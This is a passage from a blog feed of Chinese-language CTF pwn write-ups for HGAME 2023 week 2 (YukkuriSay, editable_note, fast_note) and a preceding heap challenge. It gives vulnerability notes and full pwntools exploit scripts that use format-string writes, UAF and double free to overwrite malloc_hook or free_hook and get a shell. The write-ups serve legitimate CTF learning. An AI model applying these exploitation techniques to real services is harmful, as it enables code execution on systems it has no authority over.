punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>li<span class="token punctuation">(</span><span class="token string">'libc_base = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x13</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2023-week2-pwn</title>
      <link href="/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/"/>
      <url>/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1.read不会设置缓冲区最后一个字节为’\0’ ，程序中将读取到的字符串回车改写为0，因此在输出字符串时若其中有残留地址则可泄露地址</p><p>2.gift中存在格式化字符串，但读取内容存在bss段，是非栈上的格式化字符串</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用循环中read泄露栈和libc地址</p><p>  （1）调试中下断点得到setbuf和栈到字符串的偏移</p><p>  （2）填充掉偏移部分直到所需泄露的地址，进行地址泄露</p><p>  （3）调试得到泄露到的地址和所需地址之间的偏移，直接在泄露的地址上进行加减</p><p> 2.布栈</p><p>  （1）输出ogg，在stack中找到最接近并且printf之后能运行到的地址，根据修改位数确定栈布局</p><p>3.利用格式化字符串进行任意地址写</p><p>   （1）调试中输入8个a，8个b，8个c，获取栈布局，利用fmt工具获取三个地址偏移</p><p>   （2）计算ogg低字节和低二三字节</p><p>   （3）用hhn写入单字节，hn写入双字节，实现任意地址写</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">32265</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xf8</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'What would you like to let Yukkri say?'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>setbuffer <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">204</span>libc_base <span class="token operator">=</span> setbuffer <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setbuffer'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x118</span> <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__libc_start_main  <span class="token operator">=</span> stack <span class="token operator">+</span>  <span class="token number">0x8</span>   <span class="token comment">#__libc_start_main + 24</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> p64<span class="token punctuation">(</span>__libc_start_main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__libc_start_main <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p3<span class="token punctuation">)</span>gadget1 <span class="token operator">=</span> gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span>gadget2 <span class="token operator">=</span> <span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%8$hhn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">-</span> <span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%9$hn'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'gift for you: \n'</span><span class="token punctuation">,</span>p4<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system</p><p>2.利用UAF漏洞实现任意地址写，把free_hook改成system</p><p>3.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">30756</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>本题和上题的区别在于创建堆之后不能再修改，因此可以利用double free实现任意地址写</p><p>1.利用unsorted bin泄露libc，计算出ogg</p><p>2.创建两个堆并去释放形成double free</p><p>3.找malloc_hook最近能够绕过大小检查可作为chunk的地址，在该地址上创建堆并将malloc_hook改写为ogg</p><p>4.利用double free会触发mallo_hook的特点解决堆栈不平衡，触发ogg</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span 